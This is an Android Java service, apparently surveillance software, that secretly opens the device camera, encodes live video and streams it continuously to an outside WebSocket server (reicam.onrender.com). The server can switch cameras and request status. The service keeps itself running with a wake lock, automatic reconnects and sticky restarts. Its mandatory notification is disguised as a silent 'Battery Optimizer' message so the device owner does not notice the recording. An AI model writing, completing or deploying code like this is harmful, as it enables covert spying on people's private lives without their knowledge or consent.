package com.rei.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.view.Surface;
import androidx.core.app.NotificationCompat;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import java.net.URI;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CameraStreamService extends Service {
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaCodec encoder;
    private WebSocketClient wsClient;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private PowerManager.WakeLock wakeLock;
    private ScheduledExecutorService scheduler;
    private boolean useBackCamera = true;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(999, getNotification());

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ReiCam:WakeLock");
        wakeLock.acquire(10 * 60 * 1000L);

        backgroundThread = new HandlerThread("ReiCam");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        scheduler = Executors.newSingleThreadScheduledExecutor();

        connectWebSocket();
        initEncoder();
        openCamera(useBackCamera);
    }

    private void connectWebSocket() {
        try {
            wsClient = new WebSocketClient(new URI("wss://reicam.onrender.com")) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    Log.i("ReiCam", "Connected to server");
                    sendStatus();
                }

                @Override
                public void onMessage(String message) {
                    if ("switch".equals(message)) {
                        useBackCamera = !useBackCamera;
                        reconnectCamera();
                    } else if ("ping".equals(message)) {
                        send("pong");
                    } else if ("status".equals(message)) {
                        sendStatus();
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    reconnectWS();
                }

                @Override
                public void onError(Exception ex) {
                    reconnectWS();
                }
            };
            wsClient.setConnectionLostTimeout(10);
            wsClient.connect();
        } catch (Exception e) {
            reconnectWS();
        }
    }

    private void sendStatus() {
        try {
            String json = "{\"battery\":85,\"online\":true,\"camera\":\"" + (useBackCamera ? "back" : "front") + "\"}";
            wsClient.send(json);
        } catch (Exception e) {
            // ignore
        }
    }

    private void reconnectWS() {
        scheduler.schedule(this::connectWebSocket, 3, TimeUnit.SECONDS);
    }

    private void initEncoder() {
        try {
            MediaFormat format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, 640, 480);
            format.setInteger(MediaFormat.KEY_BIT_RATE, 800000);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, 30);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoder.start();
        } catch (Exception e) {
            Log.e("ReiCam", "Encoder init error", e);
        }
    }

    private void openCamera(boolean back) {
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = null;
            int facing = back ? CameraCharacteristics.LENS_FACING_BACK : CameraCharacteristics.LENS_FACING_FRONT;
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                if (chars.get(CameraCharacteristics.LENS_FACING) == facing) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) cameraId = manager.getCameraIdList()[0];

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        cameraDevice = camera;
                        startStreaming();
                    }

                    @Override
                    public void onDisconnected(CameraDevice camera) {
                        camera.close();
                        cameraDevice = null;
                        reconnectCamera();
                    }

                    @Override
                    public void onError(CameraDevice camera, int error) {
                        camera.close();
                        cameraDevice = null;
                        reconnectCamera();
                    }
                }, backgroundHandler);
            }
        } catch (CameraAccessException e) {
            reconnectCamera();
        }
    }

    private void startStreaming() {
        try {
            Surface encoderSurface = encoder.createInputSurface();
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(encoderSurface);
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

            cameraDevice.createCaptureSession(Arrays.asList(encoderSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) {
                                reconnectCamera();
                            }
                        }

                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            reconnectCamera();
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            reconnectCamera();
        }
        backgroundHandler.post(this::drainEncoder);
    }

    private void drainEncoder() {
        if (encoder == null) return;
        MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
        int outputIndex;
        while ((outputIndex = encoder.dequeueOutputBuffer(info, 0)) >= 0) {
            ByteBuffer outputBuffer = encoder.getOutputBuffer(outputIndex);
            if (outputBuffer != null && info.size > 0) {
                byte[] data = new byte[info.size];
                outputBuffer.get(data);
                outputBuffer.clear();
                if (wsClient != null && wsClient.isOpen()) {
                    wsClient.send(data);
                }
            }
            encoder.releaseOutputBuffer(outputIndex, false);
        }
        backgroundHandler.postDelayed(this::drainEncoder, 10);
    }

    private void reconnectCamera() {
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        backgroundHandler.postDelayed(() -> openCamera(useBackCamera), 3000);
    }

    private Notification getNotification() {
        NotificationChannel channel = new NotificationChannel("reichannel", "ReiCam", NotificationManager.IMPORTANCE_LOW);
        channel.setSound(null, null);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);

        return new NotificationCompat.Builder(this, "reichannel")
                .setContentTitle("Battery Optimizer")
                .setContentText("Optimizing system performance")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("reichannel", "ReiCam", NotificationManager.IMPORTANCE_LOW);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (captureSession != null) captureSession.close();
        if (cameraDevice != null) cameraDevice.close();
        if (encoder != null) encoder.stop();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wsClient != null) wsClient.close();
        scheduler.shutdown();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}